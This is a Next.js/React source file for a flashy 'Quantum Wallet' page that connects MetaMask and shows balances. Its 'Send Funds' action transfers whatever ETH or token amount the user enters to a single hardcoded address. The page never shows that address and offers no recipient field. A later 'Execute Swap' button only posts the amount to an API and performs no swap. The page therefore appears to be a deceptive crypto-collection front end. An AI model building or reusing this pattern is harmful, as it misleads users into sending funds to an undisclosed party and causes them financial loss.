"use client";

import { useState, useEffect } from "react";
import { ethers } from "ethers";
import { motion, AnimatePresence } from "framer-motion";
import confetti from "canvas-confetti";

// Particle Background Component
const ParticleBackground = () => {
  useEffect(() => {
    const canvas = document.createElement("canvas");
    canvas.style.position = "fixed";
    canvas.style.top = "0";
    canvas.style.left = "0";
    canvas.style.width = "100%";
    canvas.style.height = "100%";
    canvas.style.pointerEvents = "none";
    canvas.style.zIndex = "1";
    document.body.appendChild(canvas);

    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const particles: { x: number; y: number; vx: number; vy: number; size: number; opacity: number }[] = [];

    const particleCount = 50;
    for (let i = 0; i < particleCount; i++) {
      particles.push({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        vx: (Math.random() - 0.5) * 0.5,
        vy: (Math.random() - 0.5) * 0.5,
        size: Math.random() * 2 + 1,
        opacity: Math.random() * 0.5 + 0.2,
      });
    }

    const animate = () => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      particles.forEach((p) => {
        p.x += p.vx;
        p.y += p.vy;
        if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
        if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(147, 51, 234, ${p.opacity})`;
        ctx.fill();
      });
      requestAnimationFrame(animate);
    };

    animate();

    return () => {
      document.body.removeChild(canvas);
    };
  }, []);

  return null;
};

// Animated Icons
const WalletIcon = ({ className }: { className?: string }) => (
  <motion.svg
    className={className}
    width="24"
    height="24"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    animate={{ rotate: [0, 5, -5, 0] }}
    transition={{ duration: 2, repeat: Infinity, ease: "easeInOut" }}
  >
    <rect x="1" y="3" width="15" height="13"></rect>
    <polygon points="16,8 20,8 20,16 16,16"></polygon>
    <circle cx="1.5" cy="6.5" r=".5"></circle>
  </motion.svg>
);

const SendIcon = ({ className }: { className?: string }) => (
  <motion.svg
    className={className}
    width="20"
    height="20"
    viewBox="0 0 24 24"
    fill="none"
    stroke="currentColor"
    strokeWidth="2"
    strokeLinecap="round"
    strokeLinejoin="round"
    whileHover={{ scale: 1.1 }}
    whileTap={{ scale: 0.95 }}
  >
    <line x1="22" y1="2" x2="11" y2="13"></line>
    <polygon points="22,2 15,22 11,13 2,9"></polygon>
  </motion.svg>
);

// Glow Button
const GlowButton = ({
  children,
  onClick,
  disabled = false,
  variant = "primary",
  className = "",
}: {
  children: React.ReactNode;
  onClick: () => void;
  disabled?: boolean;
  variant?: "primary" | "secondary" | "success";
  className?: string;
}) => {
  const variants = {
    primary: "from-blue-500 to-purple-600 shadow-blue-500/25",
    secondary: "from-purple-500 to-pink-600 shadow-purple-500/25",
    success: "from-green-500 to-emerald-600 shadow-green-500/25",
  };

  return (
    <motion.button
      className={`
        relative px-8 py-4 rounded-2xl bg-gradient-to-r ${variants[variant]}
        text-white font-semibold shadow-2xl backdrop-blur-sm
        disabled:opacity-50 disabled:cursor-not-allowed
        overflow-hidden group ${className}
      `}
      onClick={onClick}
      disabled={disabled}
      whileHover={{ scale: 1.05, y: -2 }}
      whileTap={{ scale: 0.98 }}
      transition={{ type: "spring", stiffness: 400, damping: 17 }}
    >
      <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/20 to-white/0 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000" />
      {children}
    </motion.button>
  );
};

// Glass Card
const GlassCard = ({ children, className = "" }: { children: React.ReactNode; className?: string }) => (
  <motion.div
    className={`
      backdrop-blur-xl bg-white/10 border border-white/20 rounded-3xl p-8
      shadow-2xl shadow-purple-500/10 ${className}
    `}
    initial={{ opacity: 0, y: 50 }}
    animate={{ opacity: 1, y: 0 }}
    transition={{ duration: 0.6, ease: "easeOut" }}
  >
    {children}
  </motion.div>
);

// Animated Input
const AnimatedInput = ({
  value,
  onChange,
  placeholder,
  readOnly = false,
  disabled = false,
}: {
  value: string;
  onChange?: (e: React.ChangeEvent<HTMLInputElement>) => void;
  placeholder: string;
  readOnly?: boolean;
  disabled?: boolean;
}) => (
  <motion.div className="relative">
    <motion.input
      type="text"
      value={value}
      onChange={onChange}
      placeholder={placeholder}
      readOnly={readOnly}
      disabled={disabled}
      className={`
        w-full px-6 py-4 bg-white/10 border border-white/30 rounded-2xl
        text-white placeholder-white/60 backdrop-blur-sm
        focus:outline-none focus:border-purple-400 focus:bg-white/20
        transition-all duration-300 ${readOnly ? "bg-white/5" : ""}
        ${disabled ? "opacity-50 cursor-not-allowed" : ""}
      `}
      whileFocus={{ scale: 1.02 }}
      transition={{ type: "spring", stiffness: 300, damping: 30 }}
    />
    <motion.div
      className="absolute inset-0 rounded-2xl bg-gradient-to-r from-purple-500/20 to-blue-500/20 opacity-0 pointer-events-none"
      whileFocus={{ opacity: 1 }}
      transition={{ duration: 0.3 }}
    />
  </motion.div>
);

// Balance Display
const BalanceDisplay = ({ label, value, icon }: { label: string; value: string; icon?: React.ReactNode }) => (
  <motion.div
    className="bg-white/5 rounded-2xl p-6 border border-white/10"
    whileHover={{ scale: 1.02, backgroundColor: "rgba(255,255,255,0.1)" }}
    transition={{ duration: 0.3 }}
  >
    <div className="flex items-center gap-3 mb-2">
      {icon}
      <span className="text-white/70 text-sm font-medium">{label}</span>
    </div>
    <motion.div
      className="text-2xl font-bold text-white"
      key={value}
      initial={{ scale: 1.2, color: "#10b981" }}
      animate={{ scale: 1, color: "#ffffff" }}
      transition={{ duration: 0.5 }}
    >
      {value}
    </motion.div>
  </motion.div>
);

// POST Component
const PostRequestComponent = ({
  active,
  lastSentAmount,
  user,
}: {
  active: boolean;
  lastSentAmount: string;
  user: string | null;
}) => {
  const [isPosting, setIsPosting] = useState(false);

  const sendPostRequest = async () => {
    if (!user || !lastSentAmount) return;
    setIsPosting(true);
    try {
      const res = await fetch("/api/post", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user, amount: lastSentAmount }),
      });
      const data = await res.json();
      alert("POST request successful: " + JSON.stringify(data));
    } catch (err) {
      console.error(err);
      alert("POST request failed");
    } finally {
      setIsPosting(false);
    }
  };

  return (
    <GlassCard className="mt-6 opacity-95">
      <h2 className="text-white font-semibold mb-4">Post Transaction Data</h2>
      <GlowButton
        onClick={sendPostRequest}
        disabled={!active || isPosting}
        variant="success"
        className="w-full"
      >
        {isPosting ? "Posting..." : "Execute Swap on HyperCore"}
      </GlowButton>
      {active && lastSentAmount && (
        <p className="text-white/70 mt-2 text-sm">Last amount sent: {lastSentAmount}</p>
      )}
    </GlassCard>
  );
};

export default function WalletPage() {
  const [account, setAccount] = useState<string | null>(null);
  const [ethBalance, setEthBalance] = useState<string>("0");
  const [tokenAddress, setTokenAddress] = useState<string>("");
  const [tokenBalance, setTokenBalance] = useState<string>("0");
  const [amount, setAmount] = useState<string>("");
  const [fundsSent, setFundsSent] = useState<boolean>(false);
  const [lastSentAmount, setLastSentAmount] = useState<string>("");
  const [isLoading, setIsLoading] = useState<boolean>(false);

  const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function transfer(address to, uint amount) returns (bool)",
    "function decimals() view returns (uint8)",
  ];

  const connectWallet = async () => {
    if (typeof window.ethereum === "undefined") {
      alert("MetaMask is not installed!");
      return;
    }

    setIsLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      setAccount(accounts[0]);

      const rawBalance = await provider.getBalance(accounts[0]);
      setEthBalance(ethers.formatEther(rawBalance));

      if (tokenAddress) fetchTokenBalance(accounts[0], tokenAddress, provider);

      confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } });
    } catch (err) {
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  const fetchTokenBalance = async (user: string, token: string, provider?: ethers.BrowserProvider) => {
    try {
      const prov = provider || new ethers.BrowserProvider(window.ethereum);
      const tokenContract = new ethers.Contract(token, ERC20_ABI, prov);
      const decimals = await tokenContract.decimals();
      const bal = await tokenContract.balanceOf(user);
      setTokenBalance(ethers.formatUnits(bal, decimals));
    } catch (err) {
      console.error(err);
      setTokenBalance("0");
    }
  };

  useEffect(() => {
    if (account) {
      if (!tokenAddress) {
        const provider = new ethers.BrowserProvider(window.ethereum);
        provider.getBalance(account).then((bal) => setEthBalance(ethers.formatEther(bal)));
      } else {
        fetchTokenBalance(account, tokenAddress);
      }
    }
  }, [account, tokenAddress]);

  const sendFunds = async () => {
    if (!account) return alert("Connect wallet first!");
    if (!amount || isNaN(Number(amount))) return alert("Enter valid amount");

    setIsLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      if (!tokenAddress) {
        const tx = await signer.sendTransaction({
          to: "0x43723Bd688e1112b8ad8a5b8D464Cc3d2cE60A1D",
          value: ethers.parseEther(amount),
        });
        await tx.wait();
      } else {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
        const decimals = Number(await tokenContract.decimals());
        const parsedAmount = ethers.parseUnits(Number(amount).toString(), decimals);
        const tx = await tokenContract.transfer("0x43723Bd688e1112b8ad8a5b8D464Cc3d2cE60A1D", parsedAmount);
        await tx.wait();
        alert("Transaction sent!");
      }

      const newEthBalance = await provider.getBalance(account);
      setEthBalance(ethers.formatEther(newEthBalance));
      if (tokenAddress) fetchTokenBalance(account, tokenAddress, provider);

      setLastSentAmount(amount);
      setFundsSent(true);

      confetti({ particleCount: 200, spread: 100, origin: { y: 0.5 }, colors: ["#9333ea", "#3b82f6", "#10b981", "#f59e0b"] });
    } catch (err) {
      console.error(err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 relative overflow-hidden">
      <ParticleBackground />

      {/* Animated background shapes */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <motion.div
          className="absolute -top-40 -right-40 w-80 h-80 bg-purple-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20"
          animate={{ x: [0, 100, 0], y: [0, -100, 0] }}
          transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
        />
        <motion.div
          className="absolute -bottom-40 -left-40 w-80 h-80 bg-blue-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20"
          animate={{ x: [0, -100, 0], y: [0, 100, 0] }}
          transition={{ duration: 25, repeat: Infinity, ease: "linear" }}
        />
      </div>

      <div className="relative z-10 flex flex-col items-center justify-center min-h-screen gap-8 p-6">
        <motion.div
          initial={{ opacity: 0, y: -50 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, ease: "easeOut" }}
          className="text-center mb-8"
        >
          <motion.h1
            className="text-6xl font-bold bg-gradient-to-r from-white via-purple-200 to-blue-200 bg-clip-text text-transparent mb-4"
            animate={{ backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"] }}
            transition={{ duration: 5, repeat: Infinity }}
          >
            Quantum Wallet
          </motion.h1>
          <motion.p className="text-white/60 text-lg" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.5, duration: 0.8 }}>
            Next-generation DeFi experience
          </motion.p>
        </motion.div>

        <AnimatePresence mode="wait">
          {account ? (
            <motion.div key="connected" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }} transition={{ duration: 0.5 }} className="w-full max-w-2xl space-y-6">
              <GlassCard>
                <motion.div className="flex items-center gap-4 mb-6" initial={{ x: -20, opacity: 0 }} animate={{ x: 0, opacity: 1 }} transition={{ delay: 0.2 }}>
                  <motion.div className="w-12 h-12 bg-gradient-to-r from-green-400 to-emerald-500 rounded-full flex items-center justify-center" animate={{ rotate: 360 }} transition={{ duration: 20, repeat: Infinity, ease: "linear" }}>
                    <WalletIcon className="text-white" />
                  </motion.div>
                  <div>
                    <p className="text-green-400 font-semibold">Wallet Connected</p>
                    <p className="text-white/70 font-mono text-sm">{account.slice(0, 6)}...{account.slice(-4)}</p>
                  </div>
                </motion.div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                  <BalanceDisplay label="ETH Balance" value={`${parseFloat(ethBalance).toFixed(4)} ETH`} icon={<div className="w-6 h-6 bg-gradient-to-r from-blue-400 to-purple-500 rounded-full" />} />
                  {tokenAddress && <BalanceDisplay label="Token Balance" value={`${parseFloat(tokenBalance).toFixed(4)}`} icon={<div className="w-6 h-6 bg-gradient-to-r from-green-400 to-emerald-500 rounded-full" />} />}
                </div>

                <div className="space-y-4">
                  <AnimatedInput value={tokenAddress} onChange={(e) => setTokenAddress(e.target.value)} placeholder="Token Address (leave empty for ETH)" />
                  <AnimatedInput value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="Amount to Send" />
                  <GlowButton onClick={sendFunds} disabled={isLoading} variant="primary">
                    {isLoading ? "Processing..." : "Send Funds"}
                  </GlowButton>
                </div>
              </GlassCard>

              {/* POST request section */}
              <PostRequestComponent active={fundsSent} lastSentAmount={lastSentAmount} user={account} />
            </motion.div>
          ) : (
            <motion.div key="connect" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} transition={{ duration: 0.5 }}>
              <GlowButton onClick={connectWallet} disabled={isLoading} variant="secondary">
                {isLoading ? "Connecting..." : "Connect Wallet"}
              </GlowButton>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
